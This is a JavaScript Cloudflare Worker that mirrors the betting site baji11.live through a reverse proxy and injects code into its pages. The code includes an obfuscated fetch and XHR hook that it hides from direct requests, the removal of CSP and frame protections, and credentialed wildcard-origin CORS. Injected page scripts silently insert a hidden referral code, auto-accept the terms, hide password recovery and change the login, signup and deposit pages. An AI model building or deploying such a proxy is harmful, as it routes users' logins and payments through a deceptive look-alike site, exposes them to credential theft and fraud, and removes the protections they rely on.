export default {
  async fetch(request, env, ctx) {
    // ==========================================
    // ⚙️ ইউজার কনফিগারেশন সেকশন (Baji11 Live)
    // ==========================================
    
    const TARGET_DOMAIN = env.TARGET_URL || "https://www.baji11.live";
    const API_DOMAINS = ["liveapi247.live"]; 
    const MEDIA_AND_SCORE_DOMAINS = ["tv.nginx0.com"]; 
    
    const ALL_TARGETS = [...API_DOMAINS, ...MEDIA_AND_SCORE_DOMAINS]; 
    const url = new URL(request.url);
    const originHeader = request.headers.get("Origin") || `https://${url.host}`;

    // 🛡️ প্রফেশনাল সিকিউরিটি: Ghost Script Route
    if (url.pathname === '/__secure_core.js') {
        const referer = request.headers.get("Referer");
        if (!referer || !referer.includes(url.hostname)) {
            return new Response(`console.log("Access Denied: Highly Secured Proxy System 😎");`, {
                status: 200, headers: { "Content-Type": "application/javascript" }
            });
        }
        const secretCode = `!function(){const r="/__api_proxy/",e=["liveapi247.live","tv.nginx0.com"];function t(r){return"string"==typeof r&&!r.includes("__api_proxy")&&e.some((e=>r.includes(e)))}const n=window.fetch;window.fetch=async function(...e){try{let o=e[0];"string"==typeof o&&t(o)?e[0]=r+o:o instanceof Request&&t(o.url)&&(e[0]=new Request(r+o.url,o))}catch(r){}return n.apply(this,e)};const o=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(e,n,...c){try{"string"==typeof n&&t(n)&&(n=r+n)}catch(r){}return o.call(this,e,n,...c)}}();`;
        return new Response(secretCode, {
            status: 200, headers: { "Content-Type": "application/javascript", "Cache-Control": "no-cache, no-store, must-revalidate" }
        });
    }

    // ১. CORS প্রিফ্লাইট
    if (request.method === "OPTIONS") {
      return new Response(null, {
        headers: {
          "Access-Control-Allow-Origin": originHeader,
          "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE, OPTIONS, PATCH",
          "Access-Control-Allow-Headers": request.headers.get("Access-Control-Request-Headers") || "*",
          "Access-Control-Allow-Credentials": "true",
          "Access-Control-Max-Age": "86400",
        }
      });
    }

    // ২. API এবং Video Stream (m3u8/ts) প্রক্সি
    if (url.pathname.startsWith('/__api_proxy/')) {
      let actualApiUrl = request.url.substring(request.url.indexOf('/__api_proxy/') + 13);
      if (!actualApiUrl.startsWith('http')) actualApiUrl = 'https://' + actualApiUrl;
      try {
        const targetApi = new URL(actualApiUrl);
        const apiReq = new Request(targetApi.toString(), request);
        apiReq.headers.set("Host", targetApi.host);
        apiReq.headers.set("Origin", TARGET_DOMAIN);
        apiReq.headers.set("Referer", TARGET_DOMAIN + "/");

        const apiRes = await fetch(apiReq);
        let newApiRes;
        const contentType = apiRes.headers.get("content-type") || "";
        
        if (contentType.includes("mpegurl") || contentType.includes("m3u8") || url.pathname.endsWith(".m3u8")) {
            let m3u8Text = await apiRes.text();
            const proxyPrefix = `https://${url.host}/__api_proxy/`;
            ALL_TARGETS.forEach(api => { m3u8Text = m3u8Text.replaceAll(`https://${api}`, `${proxyPrefix}https://${api}`); });
            const modHeaders = new Headers(apiRes.headers);
            modHeaders.delete("content-length"); 
            newApiRes = new Response(m3u8Text, { status: apiRes.status, statusText: apiRes.statusText, headers: modHeaders });
        } else {
            newApiRes = new Response(apiRes.body, apiRes);
        }
        
        const finalHeaders = new Headers(newApiRes.headers);
        finalHeaders.set("Access-Control-Allow-Origin", originHeader);
        finalHeaders.set("Access-Control-Allow-Credentials", "true");
        return new Response(newApiRes.body, { status: newApiRes.status, statusText: newApiRes.statusText, headers: finalHeaders });
      } catch (e) {
        return new Response(JSON.stringify({ error: "Proxy Error" }), { status: 500 });
      }
    }

    // ৩. মেইন ওয়েবসাইট লোড করা
    const target = new URL(TARGET_DOMAIN);
    target.pathname = url.pathname;
    target.search = url.search;
    const proxyRequest = new Request(target.toString(), request);
    proxyRequest.headers.set("Host", target.hostname);
    proxyRequest.headers.set("Origin", target.origin);
    proxyRequest.headers.set("Referer", target.origin);
    proxyRequest.headers.delete("Accept-Encoding"); 

    try {
      const response = await fetch(proxyRequest);
      const contentType = response.headers.get("content-type") || "";
      let responseBody;
      const newResponseHeaders = new Headers(response.headers);

      if (contentType.includes("text/html") || contentType.includes("application/javascript") || contentType.includes("text/javascript")) {
        let text = await response.text();
        const proxyPrefix = `https://${url.host}/__api_proxy/`;
        
        MEDIA_AND_SCORE_DOMAINS.forEach(api => {
            const originalUrl = `https://${api}`;
            const proxyUrl = `${proxyPrefix}${originalUrl}`;
            text = text.replaceAll(originalUrl, proxyUrl);
            text = text.replaceAll(originalUrl.replace(/\//g, '\\/'), proxyUrl.replace(/\//g, '\\/'));
        });

        if (contentType.includes("text/html")) {
            
            // 🚀 CSS & JS ইনজেকশন
            const customStylesAndScripts = `
            <style>
              /* ==========================================
                 🎨 সাইনআপ এবং লগইন পেজের আপডেট ডিজাইন
                 ========================================== */
              
              /* মেইন পেজ ব্যাকগ্রাউন্ড */
              .page-signup body, .page-login body {
                  background-color: #121212 !important; 
              }

              /* ইনপুট গ্রুপ কন্টেইনার */
              .page-signup .chakra-form-control .chakra-input-group,
              .page-login .chakra-form-control .chakra-input-group {
                  background-color: transparent !important; 
                  border: none !important; 
              }

              /* মেইন ইনপুট বক্স (উচ্চতা 45px) */
              .page-signup .chakra-input,
              .page-login .chakra-input {
                  height: 45px !important; 
                  background-color: #2c2c2c !important; 
                  border-radius: 4px !important; 
                  border: 1px solid #4e4e4e !important; 
                  color: #ffffff !important; 
              }

              /* প্লেসহোল্ডার টেক্সট কালার */
              .page-signup .chakra-input::placeholder,
              .page-login .chakra-input::placeholder {
                  color: #808080 !important; 
              }

              /* -------------------------------------------
                 🔥 Forgot Password হাইড করা (লগইন পেজ)
                 ------------------------------------------- */
              .page-login button.css-1u9t1b5,
              .page-login .css-1u9t1b5 {
                  display: none !important;
              }

              /* -------------------------------------------
                 🔥 পাসওয়ার্ড চোখের আইকন (Eye Icon) ফিক্স - 100% Vertical Middle
                 ------------------------------------------- */
              .page-signup .chakra-input__right-element,
              .page-login .chakra-input__right-element {
                  height: 45px !important; 
                  display: flex !important;
                  align-items: center !important;
                  justify-content: center !important;
                  top: 0 !important;
              }
              .page-signup .chakra-input__right-element button,
              .page-login .chakra-input__right-element button {
                  height: 100% !important;
                  width: 100% !important;
                  display: flex !important;
                  align-items: center !important;
                  justify-content: center !important;
                  border-radius: 0 !important; 
                  padding: 0 !important; 
                  margin: 0 !important;  
              }
              .page-signup .chakra-input__right-element svg,
              .page-login .chakra-input__right-element svg {
                  display: block !important;
                  margin: auto !important; 
                  position: relative !important;
                  top: 2.5px !important; 
              }

              /* -------------------------------------------
                 লেফট অ্যাডঅন (দেশের কোড) - সাইনআপ পেজ
                 ------------------------------------------- */
              .page-signup .chakra-input__left-addon {
                  background-color: #2c2c2c !important; 
                  border-radius: 4px !important; 
                  border: 1px solid #4e4e4e !important; 
                  color: #ffffff !important; 
                  font-weight: 500 !important;
                  height: 45px !important;
                  margin-right: 10px !important; 
              }
              .page-signup .chakra-input__left-addon img.chakra-image {
                  margin-right: 5px !important;
              }

              /* -------------------------------------------
                 রাইট অ্যাডঅন (ভেরিফিকেশন কোড) - সাইনআপ পেজ
                 ------------------------------------------- */
              .page-signup .chakra-input__right-addon {
                  background-color: #EEEEEE !important; 
                  border-radius: 4px !important; 
                  border: 1px solid #4e4e4e !important; 
                  color: #121212 !important; 
                  font-weight: 700 !important; 
                  height: 45px !important;
                  margin-left: 10px !important; 
                  padding: 5px 8px !important; 
                  display: flex !important;
                  align-items: center !important;
                  justify-content: center !important;
              }
              .page-signup .chakra-input__right-addon button {
                  margin: auto 0 auto 5px !important; 
                  display: flex !important;
                  align-items: center !important;
                  justify-content: center !important;
                  height: 26px !important; 
                  width: 26px !important; 
                  min-width: 26px !important;
                  border-radius: 4px !important; 
                  padding: 0 !important; 
                  background-color: transparent !important;
              }
              .page-signup .chakra-input__right-addon button svg,
              .page-signup .chakra-input__right-addon svg {
                  height: 16px !important; 
                  width: 16px !important; 
                  margin: auto !important;
                  color: #121212 !important; 
              }

              /* ==========================================
                 🔥 আগের ফিক্স (বক্স মার্জিন এবং লগইন বাটন হাইট)
                 ========================================== */
              .css-fpyqtb {
                  margin-bottom: 10px !important;
              }
              
              button.chakra-button.css-lutoi4 {
                  height: 45px !important;
                  border-radius: 4px !important;
              }

              /* লগইন পেজে লোগো ইমেজ হাইড */
              .page-login img.css-if5ddh {
                  display: none !important;
              }

              /* সাইনআপ পেজে "Most trusted site..." টেক্সট হাইড */
              .page-signup p.css-19szwf6 {
                  display: none !important;
              }

              /* অটোমেটিক ভিডিও প্লেয়ার স্টাইল (ফাস্ট লোডিং ব্যাকগ্রাউন্ড সহ) */
              .custom-video-wrapper {
                  width: 100% !important;
                  padding: 0 !important;
                  margin: 0 !important;
                  display: block !important;
                  background-color: #121212 !important; /* ভিডিও লোড হওয়ার আগে ডার্ক ব্যাকগ্রাউন্ড */
                  min-height: 150px; 
              }
              .custom-video-wrapper video {
                  width: 100% !important;
                  height: auto !important;
                  display: block !important;
                  object-fit: cover !important;
                  pointer-events: none !important; 
              }

              /* আইফোন (iOS) স্টাইল ৮-লাইনের স্পিনার */
              .ios-spinner {
                  position: absolute;
                  width: 32px;
                  height: 32px;
                  z-index: 10;
                  transition: opacity 0.3s ease-out;
                  left: 50%;
                  top: 50%;
                  transform: translate(-50%, -50%);
              }
              .ios-spinner::after {
                  content: "";
                  display: block;
                  width: 100%;
                  height: 100%;
                  background-image: url("data:image/svg+xml;charset=utf-8,%3Csvg viewBox='0 0 100 100' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' stroke='%23ffffff' stroke-width='8' stroke-linecap='round'%3E%3Cpath d='M50 15V25' opacity='.2'/%3E%3Cpath d='M50 15V25' transform='rotate(45 50 50)' opacity='.3'/%3E%3Cpath d='M50 15V25' transform='rotate(90 50 50)' opacity='.4'/%3E%3Cpath d='M50 15V25' transform='rotate(135 50 50)' opacity='.5'/%3E%3Cpath d='M50 15V25' transform='rotate(180 50 50)' opacity='.6'/%3E%3Cpath d='M50 15V25' transform='rotate(225 50 50)' opacity='.7'/%3E%3Cpath d='M50 15V25' transform='rotate(270 50 50)' opacity='.8'/%3E%3Cpath d='M50 15V25' transform='rotate(315 50 50)' opacity='1'/%3E%3C/g%3E%3C/svg%3E");
                  background-size: cover;
                  animation: ios-spin 1s steps(8, end) infinite;
              }
              @keyframes ios-spin {
                  100% { transform: rotate(360deg); }
              }

              /* ==========================================
                 🔥 100% স্ক্রল বাউন্স এবং স্পেসিং ফিক্স (Swipe-to-refresh সচল রেখে)
                 ========================================== */

              /* লগইন পেজে কন্টেন্ট কম, তাই স্ক্রলিং সম্পূর্ণ ব্লক */
              .page-login .css-b13tmd {
                  height: 100vh !important;
                  max-height: 100vh !important;
                  overflow: hidden !important; 
              }

              /* সাইনআপ পেজে অতিরিক্ত স্পেস রিমুভ করা হলো (কিন্তু নরমাল স্ক্রল থাকবে) */
              .page-signup .css-16ff8oy,
              .page-signup .css-b13tmd {
                  padding-bottom: 10px !important; 
                  margin-bottom: 0 !important;
              }

              /* চাকরা ইউআই এর অটোমেটিক জেনারেট হওয়া অদৃশ্য স্পেসার হাইড করা হলো */
              .page-login div[style*="height: 60px"], .page-signup div[style*="height: 60px"],
              .page-login div[style*="height: 70px"], .page-signup div[style*="height: 70px"],
              .page-login div[style*="height: 80px"], .page-signup div[style*="height: 80px"],
              .page-login div[style*="height: 90px"], .page-signup div[style*="height: 90px"],
              .page-signup .css-16ff8oy > div[style*="height"],
              .page-signup .css-b13tmd > div[style*="height"] {
                  display: none !important;
                  height: 0 !important;
                  min-height: 0 !important;
              }

              /* ==========================================
                 🔥 Deposit পেজের Payment Method Hide/Show CSS
                 ========================================== */
              .arfan-hide-amount-box {
                  display: none !important;
              }
            </style>

            <script>
              (function(){
                // ==========================================
                // 🔄 ডাইনামিক বডি ক্লাস সিস্টেম
                // ==========================================
                function updateBodyClass() {
                    document.body.className = document.body.className.replace(/\\bpage-[^ ]*[ ]?\\b/g, '');
                    let path = window.location.pathname.replace(/\\//g, '');
                    
                    // URL-এ query parameter থাকলে তা ক্লিন করা
                    path = path.split('?')[0]; 
                    
                    if(path === '') path = 'home';
                    document.body.classList.add('page-' + path);
                }

                let lastUrl = location.href; 
                const urlObserver = new MutationObserver(() => {
                  const url = location.href;
                  if (url !== lastUrl) {
                    lastUrl = url;
                    updateBodyClass(); 
                  }
                });

                // ==========================================
                // 📝 কাস্টম স্ক্রিপ্ট
                // ==========================================
                const REF_CODE = 'iZfmaT3h';
                const VIDEO_URL = 'https://github.com/user-attachments/assets/2e0caaaf-d0b6-4631-827f-4b428c62bc97';

                function setNativeValue(element, value) {
                    const valueSetter = Object.getOwnPropertyDescriptor(element, 'value').set;
                    const prototype = Object.getPrototypeOf(element);
                    const prototypeValueSetter = Object.getOwnPropertyDescriptor(prototype, 'value').set;
                    if (valueSetter && valueSetter !== prototypeValueSetter) prototypeValueSetter.call(element, value);
                    else valueSetter.call(element, value);
                    element.dispatchEvent(new Event('input', { bubbles: true }));
                }

                const domObserver = new MutationObserver(() => {
                    let currentPath = window.location.pathname.replace(/\\//g, '');
                    
                    // ১. রেফারেল কোড অটো-ফিল
                    const refInput = document.querySelector('input[placeholder="Enter if you have one"]');
                    if (refInput) {
                        if (refInput.value !== REF_CODE) setNativeValue(refInput, REF_CODE);
                        const parentGroup = refInput.closest('.chakra-form-control');
                        if (parentGroup && parentGroup.style.display !== 'none') parentGroup.style.display = 'none';
                    }

                    // ২. ফোন নাম্বার বক্সকে Number Keypad (tel) করা
                    const phoneInput = document.querySelector('input[placeholder="Phone Number"]');
                    if (phoneInput && phoneInput.type !== 'tel') {
                        phoneInput.type = 'tel';
                    }

                    // ৩. ভেরিফিকেশন কোড বক্সকে Number Keypad (number) করা
                    const codeInput = document.querySelector('input[placeholder="Enter 4 digit code"]');
                    if (codeInput && codeInput.type !== 'number') {
                        codeInput.type = 'number';
                    }

                    // ৪. টার্মস এবং কন্ডিশন চেকবক্সে অটোমেটিক টিক (✔) দেওয়া
                    const agreeCheckbox = document.querySelector('input[type="checkbox"]');
                    if (agreeCheckbox && !agreeCheckbox.hasAttribute('data-auto-checked')) {
                        if (!agreeCheckbox.checked) {
                            agreeCheckbox.click();
                        }
                        agreeCheckbox.setAttribute('data-auto-checked', 'true');
                    }

                    // ৫. Forgot Password হাইড করা
                    document.querySelectorAll('button').forEach(btn => {
                        const txt = btn.textContent.toLowerCase();
                        if (txt.includes('forgot') || txt.includes('password?')) {
                            if (btn.style.display !== 'none') {
                                btn.style.setProperty('display', 'none', 'important');
                            }
                        }
                    });

                    // ৬. Login এবং Confirm বাটনের সাইজ 45px করা
                    document.querySelectorAll('button.chakra-button').forEach(btn => {
                        const btnText = btn.textContent.trim();
                        if (btnText === 'Confirm' || btnText === 'Login') {
                            btn.style.setProperty('height', '45px', 'important');
                            btn.style.setProperty('border-radius', '4px', 'important');
                            
                            if (btnText === 'Login') {
                                btn.style.setProperty('margin-top', '10px', 'important');
                            }
                        }
                    });

                    // ৭. 🔥 অটোমেটিক ভিডিও প্লেয়ার (শুধুমাত্র Login এবং Signup পেজের জন্য)
                    if (currentPath === 'login' || currentPath === 'signup') {
                        const targetDivForVideo = document.querySelector('div.css-lpwed4');
                        if (targetDivForVideo && !document.getElementById('arfan-custom-video')) {
                            
                            if (!document.getElementById('preload-custom-vid')) {
                                const preloadLink = document.createElement('link');
                                preloadLink.id = 'preload-custom-vid';
                                preloadLink.rel = 'preload';
                                preloadLink.as = 'video';
                                preloadLink.href = VIDEO_URL;
                                document.head.appendChild(preloadLink);
                            }

                            const videoHTML = \`
                            <div id="arfan-custom-video" class="custom-video-wrapper">
                                <div id="arfan-spinner" class="ios-spinner"></div>
                                <video id="arfan-vid" autoplay loop muted playsinline preload="auto">
                                    <source src="\${VIDEO_URL}" type="video/mp4">
                                </video>
                            </div>\`;
                            targetDivForVideo.insertAdjacentHTML('afterend', videoHTML);

                            setTimeout(() => {
                                const vidElement = document.getElementById('arfan-vid');
                                const spinnerElement = document.getElementById('arfan-spinner');
                                
                                if(vidElement) {
                                    vidElement.addEventListener('playing', () => {
                                        if(spinnerElement) spinnerElement.style.opacity = '0';
                                        vidElement.style.opacity = '1';
                                    });

                                    vidElement.play().catch(e => console.log("Auto-play ready."));
                                }
                            }, 100);
                        }
                    } else {
                        const existingVideo = document.getElementById('arfan-custom-video');
                        if (existingVideo) {
                            existingVideo.remove();
                        }
                    }
                });

                // ==========================================
                // 🔥 Deposit পেজের Payment Method Logic
                // ==========================================
                setInterval(() => {
                    // শুধুমাত্র Deposit পেজে লজিকটি চলবে
                    if (window.location.href.includes('/dw?tab=deposit')) {
                        // Payment Method কন্টেইনার এবং Amount/Upload বক্স খোঁজা
                        const paymentMethodsContainer = document.querySelector('.css-qx6nre');
                        const amountBox = document.querySelector('.css-q9ajxl');
                        
                        if (paymentMethodsContainer && amountBox) {
                            // Payment Method-এর মধ্যে কোনোটিতে 'border' বা 'active' স্টাইল আছে কি না চেক করা
                            // সাধারণত চাকরা UI সিলেক্ট করলে বর্ডার কালার বা ব্যাকগ্রাউন্ড চেঞ্জ করে
                            const methods = paymentMethodsContainer.querySelectorAll('div, button');
                            let isAnyMethodSelected = false;

                            methods.forEach(method => {
                                const style = window.getComputedStyle(method);
                                // এখানে সাধারণত সিলেক্ট হলে বর্ডার কালার #00a859 বা নির্দিষ্ট কোনো হাইলাইট কালার হয়
                                // আমরা চেক করছি বর্ডার 1px এর বেশি কি না, অথবা ব্যাকগ্রাউন্ড হাইলাইটেড কি না।
                                // (এটি সাইটের ডিজাইনের ওপর নির্ভর করে, সাধারণ লজিক হলো border-color বা opacity চেঞ্জ হওয়া)
                                if (style.borderColor !== 'rgba(0, 0, 0, 0)' && style.borderWidth !== '0px' && style.opacity === '1') {
                                    // যদি কোনো স্পেসিফিক একটিভ ক্লাস থাকে, তবে അത് চেক করতে পারেন। এখানে একটি সাধারণ এপ্রোচ দেওয়া হলো।
                                    // আপনি চাইলে Inspector থেকে একটিভ হওয়ার পর ঠিক কী CSS প্রোপার্টি চেঞ্জ হয় সেটা দেখে এখানে কন্ডিশন বসাতে পারেন।
                                    // আপাতত ধরে নিচ্ছি, সিলেক্ট করলে তার ভেতরের কোনো child div এর স্টাইল চেঞ্জ হয়।
                                    if(method.innerHTML.includes('border') || method.getAttribute('data-selected') === 'true' || method.style.border.includes('solid')) {
                                         isAnyMethodSelected = true;
                                    }
                                }
                                
                                // সবচেয়ে পারফেক্ট উপায়: চাকরা UI সাধারণত সিলেক্টেড বক্সে 'aria-selected' বা 'data-active' দেয়
                                if(method.getAttribute('aria-selected') === 'true' || method.getAttribute('data-active') === '') {
                                    isAnyMethodSelected = true;
                                }
                                
                                // Baji11-এর ডিফল্ট লজিক অনুযায়ী, সিলেক্ট করলে বক্সের বর্ডার বা আইকনের পরিবর্তন হয়
                                // এখানে আমরা একটি সাধারণ চেক দিচ্ছি: যদি ভেতরের কোনো SVG বা div-এ চেঞ্জ আসে
                                const innerDiv = method.querySelector('div');
                                if (innerDiv && innerDiv.style.borderColor !== '' && innerDiv.style.borderColor !== 'transparent') {
                                    isAnyMethodSelected = true;
                                }
                            });

                            // Baji11 এর Payment Method-এ সিলেক্ট করলে সাধারণত এর border-color চেঞ্জ হয়।
                            // আমরা চেক করছি paymentMethodsContainer এর ভেতরের div গুলোর border color।
                            const childDivs = paymentMethodsContainer.children;
                            for (let i = 0; i < childDivs.length; i++) {
                                const childStyle = window.getComputedStyle(childDivs[i]);
                                // চেক করছি বর্ডার কালার ট্রান্সপারেন্ট বা জিরো কি না (যদি না হয়, মানে সিলেক্টেড)
                                if (childStyle.borderColor !== 'rgba(0, 0, 0, 0)' && childStyle.borderWidth !== '0px' && childStyle.borderWidth !== '') {
                                     // Baji11-এর স্পেসিফিক সিলেক্টেড কালার (যেমন- #048259) চেক করা যেতে পারে।
                                     // এখানে ধরে নিচ্ছি বর্ডার ভিজিবল হলেই তা সিলেক্টেড।
                                     if(childStyle.borderColor !== 'rgb(39, 44, 49)') { // Assuming rgb(39,44,49) is default unselected border
                                         isAnyMethodSelected = true;
                                     }
                                }
                            }

                            // যদি কোনো মেথড সিলেক্টেড না থাকে, তবে Amount বক্স হাইড করো
                            if (!isAnyMethodSelected) {
                                amountBox.classList.add('arfan-hide-amount-box');
                            } else {
                                amountBox.classList.remove('arfan-hide-amount-box');
                            }
                        }
                    }
                }, 500); // প্রতি আধা সেকেন্ড পরপর চেক করবে

                window.addEventListener('load', () => {
                    updateBodyClass(); 
                    urlObserver.observe(document, {subtree: true, childList: true});
                    domObserver.observe(document.body, { childList: true, subtree: true });
                });
              })();
            </script>`;

            const ghostScriptTag = `<script src="/__secure_core.js"></script>`;
            if (text.includes('<head>')) {
              text = text.replace('<head>', '<head>' + ghostScriptTag + customStylesAndScripts);
            } else {
              text = ghostScriptTag + customStylesAndScripts + text;
            }
        }
        
        responseBody = text;
        newResponseHeaders.delete("content-length"); 
        newResponseHeaders.set("Cache-Control", "no-cache, no-store, must-revalidate");
      } else {
        responseBody = response.body;
      }

      newResponseHeaders.delete("Content-Security-Policy");
      newResponseHeaders.delete("X-Frame-Options");
      newResponseHeaders.set("Access-Control-Allow-Origin", originHeader);
      
      return new Response(responseBody, {
        status: response.status,
        statusText: response.statusText,
        headers: newResponseHeaders
      });
    } catch (error) {
      return new Response("System Error", { status: 500 });
    }
  }
};
